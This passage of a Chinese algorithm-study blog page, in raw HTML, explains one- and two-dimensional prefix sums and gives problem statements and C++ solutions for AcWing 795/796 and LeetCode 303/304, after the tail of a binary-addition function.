class="hljs-type">int</span>&gt;A,B;<br>       <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=a.<span class="hljs-built_in">size</span>()<span class="hljs-number">-1</span>;i&gt;=<span class="hljs-number">0</span>;i--) A.<span class="hljs-built_in">push_back</span>(a[i]-<span class="hljs-string">&#x27;0&#x27;</span>);<br>       <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=b.<span class="hljs-built_in">size</span>()<span class="hljs-number">-1</span>;i&gt;=<span class="hljs-number">0</span>;i--) B.<span class="hljs-built_in">push_back</span>(b[i]-<span class="hljs-string">&#x27;0&#x27;</span>);<br>       string C;<br>       <span class="hljs-type">int</span> t=<span class="hljs-number">0</span>;<br>       <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;A.<span class="hljs-built_in">size</span>()||i&lt;B.<span class="hljs-built_in">size</span>();i++)<br>       &#123;<br>           <span class="hljs-keyword">if</span>(i&lt;A.<span class="hljs-built_in">size</span>()) t+=A[i];<br>           <span class="hljs-keyword">if</span>(i&lt;B.<span class="hljs-built_in">size</span>()) t+=B[i];<br>           C+=(t%<span class="hljs-number">2</span>+<span class="hljs-string">&#x27;0&#x27;</span>);<br>           t/=<span class="hljs-number">2</span>;<br>       &#125;<br>       <span class="hljs-keyword">if</span>(t) C+=(<span class="hljs-number">1</span>+<span class="hljs-string">&#x27;0&#x27;</span>);<br>       <span class="hljs-built_in">reverse</span>(C.<span class="hljs-built_in">begin</span>(),C.<span class="hljs-built_in">end</span>());<br>       <span class="hljs-keyword">return</span> C;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="前缀和">前缀和</h1><h2 id="一维前缀和">一维前缀和</h2><p>将A[1]+......A[n](n为变量)的值一一单独存入另一个数组中，然后查找区间的前缀和时，只要S[R]-S[L-1]即可得到区间前缀和（为啥是l-1，因为S[R]=A[1]+....A[R]，S[L-1]=A[1]+....+A[L-1],两个相减就可以得到A[L]+...+A[R]</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs excel"><span class="hljs-number">795</span> 前缀和<br>输入一个长度为 <span class="hljs-built_in">n</span> 的整数序列。<br><br>接下来再输入 m 个询问，每个询问输入一对 l,r。<br><br>对于每个询问，输出原序列中从第 l 个数到第 r 个数的和。<br><br>输入格式<br>第一行包含两个整数 <span class="hljs-built_in">n</span> 和 m。<br><br>第二行包含 <span class="hljs-built_in">n</span> 个整数，表示整数数列。<br><br>接下来 m 行，每行包含两个整数 l 和 r，表示一个询问的区间范围。<br><br>输出格式<br>共 m 行，每行输出一个询问的结果。<br><br>数据范围<br><span class="hljs-number">1</span>≤l≤r≤<span class="hljs-built_in">n</span>,<br><span class="hljs-number">1</span>≤<span class="hljs-built_in">n</span>,m≤<span class="hljs-number">100000</span>,<br>−<span class="hljs-number">1000</span>≤数列中元素的值≤<span class="hljs-number">1000</span><br>输入样例：<br><span class="hljs-number">5</span> <span class="hljs-number">3</span><br><span class="hljs-number">2</span> <span class="hljs-number">1</span> <span class="hljs-number">3</span> <span class="hljs-number">6</span> <span class="hljs-number">4</span><br><span class="hljs-number">1</span> <span class="hljs-number">2</span><br><span class="hljs-number">1</span> <span class="hljs-number">3</span><br><span class="hljs-number">2</span> <span class="hljs-number">4</span><br>输出样例：<br><span class="hljs-number">3</span><br><span class="hljs-number">6</span><br><span class="hljs-number">10</span><br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N = <span class="hljs-number">1e5</span>+<span class="hljs-number">10</span>;<br><span class="hljs-type">int</span> q[N],s[N];<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    ios::<span class="hljs-built_in">sync_with_stdio</span>(<span class="hljs-literal">false</span>);<br>    <span class="hljs-type">int</span> n,m;<br>    cin&gt;&gt;n&gt;&gt;m;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++) cin&gt;&gt;q[i];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++) s[i]=s[i<span class="hljs-number">-1</span>]+q[i];<br>    <span class="hljs-keyword">while</span>(m--)<br>    &#123;<br>        <span class="hljs-type">int</span> l,r;<br>        cin&gt;&gt;l&gt;&gt;r;<br>        cout&lt;&lt;s[r]-s[l<span class="hljs-number">-1</span>]&lt;&lt;endl;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="leetcode303">leetcode303</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">303.</span> 区域和检索 <span class="hljs-operator">-</span> 数组不可变<br>给定一个整数数组  nums，处理以下类型的多个查询:<br><br>计算索引 <span class="hljs-keyword">left</span> 和 <span class="hljs-keyword">right</span> （包含 <span class="hljs-keyword">left</span> 和 <span class="hljs-keyword">right</span>）之间的 nums 元素的 和 ，其中 <span class="hljs-keyword">left</span> <span class="hljs-operator">&lt;=</span> <span class="hljs-keyword">right</span><br>实现 NumArray 类：<br><br>NumArray(<span class="hljs-type">int</span>[] nums) 使用数组 nums 初始化对象<br><span class="hljs-type">int</span> sumRange(<span class="hljs-type">int</span> i, <span class="hljs-type">int</span> j) 返回数组 nums 中索引 <span class="hljs-keyword">left</span> 和 <span class="hljs-keyword">right</span> 之间的元素的 总和 ，包含 <span class="hljs-keyword">left</span> 和 <span class="hljs-keyword">right</span> 两点（也就是 nums[<span class="hljs-keyword">left</span>] <span class="hljs-operator">+</span> nums[<span class="hljs-keyword">left</span> <span class="hljs-operator">+</span> <span class="hljs-number">1</span>] <span class="hljs-operator">+</span> ... <span class="hljs-operator">+</span> nums[<span class="hljs-keyword">right</span>] )<br> <br><br>示例 <span class="hljs-number">1</span>：<br><br>输入：<br>[&quot;NumArray&quot;, &quot;sumRange&quot;, &quot;sumRange&quot;, &quot;sumRange&quot;]<br>[[[<span class="hljs-number">-2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>, <span class="hljs-number">-5</span>, <span class="hljs-number">2</span>, <span class="hljs-number">-1</span>]], [<span class="hljs-number">0</span>, <span class="hljs-number">2</span>], [<span class="hljs-number">2</span>, <span class="hljs-number">5</span>], [<span class="hljs-number">0</span>, <span class="hljs-number">5</span>]]<br>输出：<br>[<span class="hljs-keyword">null</span>, <span class="hljs-number">1</span>, <span class="hljs-number">-1</span>, <span class="hljs-number">-3</span>]<br><br>解释：<br>NumArray numArray <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> NumArray([<span class="hljs-number">-2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>, <span class="hljs-number">-5</span>, <span class="hljs-number">2</span>, <span class="hljs-number">-1</span>]);<br>numArray.sumRange(<span class="hljs-number">0</span>, <span class="hljs-number">2</span>); <span class="hljs-operator">/</span><span class="hljs-operator">/</span> <span class="hljs-keyword">return</span> <span class="hljs-number">1</span> ((<span class="hljs-number">-2</span>) <span class="hljs-operator">+</span> <span class="hljs-number">0</span> <span class="hljs-operator">+</span> <span class="hljs-number">3</span>)<br>numArray.sumRange(<span class="hljs-number">2</span>, <span class="hljs-number">5</span>); <span class="hljs-operator">/</span><span class="hljs-operator">/</span> <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span> (<span class="hljs-number">3</span> <span class="hljs-operator">+</span> (<span class="hljs-number">-5</span>) <span class="hljs-operator">+</span> <span class="hljs-number">2</span> <span class="hljs-operator">+</span> (<span class="hljs-number">-1</span>)) <br>numArray.sumRange(<span class="hljs-number">0</span>, <span class="hljs-number">5</span>); <span class="hljs-operator">/</span><span class="hljs-operator">/</span> <span class="hljs-keyword">return</span> <span class="hljs-number">-3</span> ((<span class="hljs-number">-2</span>) <span class="hljs-operator">+</span> <span class="hljs-number">0</span> <span class="hljs-operator">+</span> <span class="hljs-number">3</span> <span class="hljs-operator">+</span> (<span class="hljs-number">-5</span>) <span class="hljs-operator">+</span> <span class="hljs-number">2</span> <span class="hljs-operator">+</span> (<span class="hljs-number">-1</span>))<br> <br><br>提示：<br><br><span class="hljs-number">1</span> <span class="hljs-operator">&lt;=</span> nums.length <span class="hljs-operator">&lt;=</span> <span class="hljs-number">104</span><br><span class="hljs-number">-105</span> <span class="hljs-operator">&lt;=</span> nums[i] <span class="hljs-operator">&lt;=</span> <span class="hljs-number">105</span><br><span class="hljs-number">0</span> <span class="hljs-operator">&lt;=</span> i <span class="hljs-operator">&lt;=</span> j <span class="hljs-operator">&lt;</span> nums.length<br>最多调用 <span class="hljs-number">104</span> 次 sumRange 方法<br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">NumArray</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    vector&lt;<span class="hljs-type">int</span>&gt;sum;<br>    <span class="hljs-built_in">NumArray</span>(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums) &#123;<br>        sum.<span class="hljs-built_in">push_back</span>(<span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=nums.<span class="hljs-built_in">size</span>();i++)<br>           sum.<span class="hljs-built_in">push_back</span>(sum[i<span class="hljs-number">-1</span>]+nums[i<span class="hljs-number">-1</span>]);<br>    &#125;<br>    <br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">sumRange</span><span class="hljs-params">(<span class="hljs-type">int</span> left, <span class="hljs-type">int</span> right)</span> </span>&#123;<br>       <span class="hljs-keyword">return</span> sum[right+<span class="hljs-number">1</span>]-sum[left];<br>    &#125;<br>&#125;;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Your NumArray object will be instantiated and called as such:</span><br><span class="hljs-comment"> * NumArray* obj = new NumArray(nums);</span><br><span class="hljs-comment"> * int param_1 = obj-&gt;sumRange(left,right);</span><br><span class="hljs-comment"> */</span><br></code></pre></td></tr></table></figure><h2 id="二维前缀和">二维前缀和</h2><p>二维前缀和推导 如图：<imgsrc="https://s2.loli.net/2022/04/16/SfGoOxAmku5Dild.png" alt="" /></p><p>紫色面积是指(1,1)左上角到(i,j-1)右下角的矩形面积,绿色面积是指(1,1)左上角到(i-1, j)右下角的矩形面积。每一个颜色的矩形面积都代表了它所包围元素的和。<imgsrc="https://s2.loli.net/2022/04/16/4i6l5raRcU7zgQX.png"alt="在这里插入图片描述" /></p><p>从图中我们很容易看出，整个外围蓝色矩形面积s[i] [j] = 绿色面积s[i-1][j] + 紫色面积s[i] [j-1] - 重复加的红色的面积s[i-1][j-1]+小方块的面积a[i] [j];</p><p>因此得出二维前缀和预处理公式</p><p>s[i] [j] = s[i-1] [j] + s[i] [j-1 ] + a[i] [j] - s[i-1] [ j-1](是离散的数，不是面积哈)</p><p>接下来回归问题去求以(x1,y1)为左上角和以(x2,y2)为右下角的矩阵的元素的和。</p><p>如图：<img src="https://s2.loli.net/2022/04/16/B9GnoqSmsPZfFpC.png"alt="" /></p><p>紫色面积是指 ( 1,1 )左上角到(x1-1,y2)右下角的矩形面积，黄色面积是指(1,1)左上角到(x2,y1-1)右下角的矩形面积；</p><p>不难推出：<imgsrc="https://s2.loli.net/2022/04/16/jdTypKLX8qQ1tbA.png"alt="在这里插入图片描述" /></p><p>绿色矩形的面积 = 整个外围面积s[x2, y2] - 黄色面积s[x2, y1 - 1] -紫色面积s[x1 - 1, y2] + 重复减去的红色面积 s[x1 - 1, y1 - 1]</p><p>因此二维前缀和的结论为：</p><p>以(x1, y1)为左上角，(x2, y2)为右下角的子矩阵的和为： s[x2, y2] - s[x1- 1, y2] - s[x2, y1 - 1] + s[x1 - 1, y1 - 1]</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs tap">796 二维前缀和<br>输入一个 n 行 m 列的整数矩阵，再输入 q 个询问，每个询问包含四个整数 x1,y1,x2,y2，表示一个子矩阵的左上角坐标和右下角坐标。<br><br>对于每个询问输出子矩阵中所有数的和。<br><br>输入格式<br>第一行包含三个整数 n，m，q。<br><br>接下来 n 行，每行包含 m 个整数，表示整数矩阵。<br><br>接下来 q 行，每行包含四个整数 x1,y1,x2,y2，表示一组询问。<br><br>输出格式<br>共 q 行，每行输出一个询问的结果。<br><br>数据范围<br>1≤n,m≤1000,<br>1≤q≤200000,<br>1≤x1≤x2≤n,<br>1≤y1≤y2≤m,<br>−1000≤矩阵内元素的值≤1000<br>输入样例：<br>3<span class="hljs-number"> 4 </span>3<br>1<span class="hljs-number"> 7 </span>2 4<br>3<span class="hljs-number"> 6 </span>2 8<br>2<span class="hljs-number"> 1 </span>2 3<br>1<span class="hljs-number"> 1 </span>2 2<br>2<span class="hljs-number"> 1 </span>3 4<br>1<span class="hljs-number"> 3 </span>3 4<br>输出样例：<br>17<br>27<br>21<br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">1e3</span>+<span class="hljs-number">10</span>;<br><span class="hljs-type">int</span> a[N][N],s[N][N];<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> n,m,q;<br>    cin&gt;&gt;n&gt;&gt;m&gt;&gt;q;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)<br>      <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">1</span>;j&lt;=m;j++)<br>       <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;a[i][j]);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)<br>      <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">1</span>;j&lt;=m;j++)<br>         s[i][j]=s[i<span class="hljs-number">-1</span>][j]+s[i][j<span class="hljs-number">-1</span>]-s[i<span class="hljs-number">-1</span>][j<span class="hljs-number">-1</span>]+a[i][j];<br>    <span class="hljs-keyword">while</span>(q--)<br>    &#123;<br>        <span class="hljs-type">int</span> x1,x2,y1,y2;<br>        cin&gt;&gt;x1&gt;&gt;y1&gt;&gt;x2&gt;&gt;y2;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>,s[x2][y2]-s[x1<span class="hljs-number">-1</span>][y2]-s[x2][y1<span class="hljs-number">-1</span>]+s[x1<span class="hljs-number">-1</span>][y1<span class="hljs-number">-1</span>]);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="leetcode304">leetcode304</h3><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs prolog"><span class="hljs-number">304.</span> 二维区域和检索 - 矩阵不可变<br>给定一个二维矩阵 matrix，以下类型的多个请求：<br><br>计算其子矩形范围内元素的总和，该子矩阵的 左上角 为 (row1, col1) ，右下角 为 (row2, col2) 。<br>实现 <span class="hljs-symbol">NumMatrix</span> 类：<br><br><span class="hljs-symbol">NumMatrix</span>(int[][] matrix) 给定整数矩阵 matrix 进行初始化<br>int sumRegion(int row1, int col1, int row2, int col2) 返回 左上角 (row1, col1) 、右下角 (row2, col2) 所描述的子矩阵的元素 总和 。<br> <br><br>示例 <span class="hljs-number">1</span>：<br>自己取leetcode上看吧<br>输入: <br>[<span class="hljs-string">&quot;NumMatrix&quot;</span>,<span class="hljs-string">&quot;sumRegion&quot;</span>,<span class="hljs-string">&quot;sumRegion&quot;</span>,<span class="hljs-string">&quot;sumRegion&quot;</span>]<br>[[[[<span class="hljs-number">3</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">4</span>,<span class="hljs-number">2</span>],[<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>],[<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">5</span>],[<span class="hljs-number">4</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">7</span>],[<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">3</span>,<span class="hljs-number">0</span>,<span class="hljs-number">5</span>]]],[<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">4</span>,<span class="hljs-number">3</span>],[<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>],[<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">4</span>]]<br>输出: <br>[null, <span class="hljs-number">8</span>, <span class="hljs-number">11</span>, <span class="hljs-number">12</span>]<br><br>解释:<br><span class="hljs-symbol">NumMatrix</span> numMatrix = new <span class="hljs-symbol">NumMatrix</span>([[<span class="hljs-number">3</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">4</span>,<span class="hljs-number">2</span>],[<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>],[<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">5</span>],[<span class="hljs-number">4</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">7</span>],[<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">3</span>,<span class="hljs-number">0</span>,<span class="hljs-number">5</span>]]);<br>numMatrix.sumRegion(<span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>); // return <span class="hljs-number">8</span> (红色矩形框的元素总和)<br>numMatrix.sumRegion(<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>); // return <span class="hljs-number">11</span> (绿色矩形框的元素总和)<br>numMatrix.sumRegion(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">4</span>); // return <span class="hljs-number">12</span> (蓝色矩形框的元素总和)<br> <br><br>提示：<br><br>m == matrix.length<br>n == matrix[i].length<br><span class="hljs-number">1</span> &lt;= m, n &lt;= <span class="hljs-number">200</span><br><span class="hljs-number">-105</span> &lt;= matrix[i][j] &lt;= <span class="hljs-number">105</span><br><span class="hljs-number">0</span> &lt;= row1 &lt;= row2 &lt; m<br><span class="hljs-number">0</span> &lt;= col1 &lt;= col2 &lt; n<br>最多调用 <span class="hljs-number">104</span> 次 sumRegion 方法<br>通过次数<span class="hljs-number">86</span>,<span class="hljs-number">115</span>提交次数<span class="hljs-number">148</span>,<span class="hljs-number">070</span><br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">NumMatrix</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-type">int</span> sum[<span class="hljs-number">2000</span>][<span class="hljs-number">2000</span>];<br>    <span class="hljs-built_in">NumMatrix</span>(vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt;&amp; matrix) &#123;<br>       <span class="hljs-type">int</span> n=matrix.<span class="hljs-built_in">size</span>(),m=matrix[<span class="hljs-number">0</span>].<span class="hljs-built_in">size</span>();<span class="hljs-comment">//获得vector数组的列数和每行长度</span><br>       <span class="hljs-keyword">if</span>(n&gt;<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">1</span>;j&lt;=m;j++)<br>                sum[i][j]=sum[i<span class="hljs-number">-1</span>][j]+sum[i][j<span class="hljs-number">-1</span>]-sum[i<span class="hljs-number">-1</span>][j<span class="hljs-number">-1</span>]+matrix[i<span class="hljs-number">-1</span>][j<span class="hljs-number">-1</span>];<span class="hljs-comment">//最后matrix[i-1][j-1]是因为我们是从i=1,j=1开始，但是原数组是从i=0,j=0开始</span><br>       &#125;<br>    &#125;<br>    <br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">sumRegion</span><span class="hljs-params">(<span class="hljs-type">int</span> row1, <span class="hljs-type">int</span> col1, <span class="hljs-type">int</span> row2, <span class="hljs-type">int</span> col2)</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> sum[row2+<span class="hljs-number">1</span>][col2+<span class="hljs-number">1</span>]-sum[row1][col2+<span class="hljs-number">1</span>]-sum[row2+<span class="hljs-number">1</span>][col1]+sum[row1][col1];<br>    &#125;<br>&#125;;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Your NumMatrix object will be instantiated and called as such:</span><br><span class="hljs-comment"> * NumMatrix* obj = new NumMatrix(matrix);</span><br><span class="hljs-comment"> * int param_1 = obj-&gt;sumRegion(row1,col1,row2,col2);</span><br><span class="hljs-comment"> */</span><br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">NumMatrix</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; sum;<span class="hljs-comment">//vector数组</span><br>    <span class="hljs-built_in">NumMatrix</span>(vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt;&amp; matrix) &#123;<br>       <span class="hljs-type">int</span> n=matrix.<span class="hljs-built_in">size</span>(),m=matrix[<span class="hljs-number">0</span>].<span class="hljs-built_in">size</span>();<span class="hljs-comment">//获得原数组的列数和每行长度</span><br>       <span class="hljs-keyword">if</span>(n&gt;<span class="hljs-number">0</span>)&#123;<br>        sum.<span class="hljs-built_in">resize</span>(n+<span class="hljs-number">1</span>,<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;(m+<span class="hljs-number">1</span>,<span class="hljs-number">0</span>));<span class="hljs-comment">//多加一行和一列，从第一行和第一列开始</span><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">1</span>;j&lt;=m;j++)<br>                sum[i][j]=sum[i<span class="hljs-number">-1</span>][j]+sum[i][j<span class="hljs-number">-1</span>]-sum[i<span class="hljs-number">-1</span>][j<span class="hljs-number">-1</span>]+matrix[i<span class="hljs-number">-1</span>][j<span class="hljs-number">-1</span>];<span class="hljs-comment">//最后matrix[i-1][j-1]是因为我们是从i=1,j=1开始，但是原数组是从i=0,j=0开始</span><br>       &#125;<br>    &#125;<br>    <br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">sumRegion</span><span class="hljs-params">(<span class="hljs-type">int</span> row1, <span class="hljs-type">int</span> col1, <span class="hljs-type">int</span> row2, <span class="hljs-type">int</span> col2)</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> sum[row2+<span class="hljs-number">1</span>][col2+<span class="hljs-number">1</span>]-sum[row1][col2+<span class="hljs-number">1</span>]-sum[row2+<span 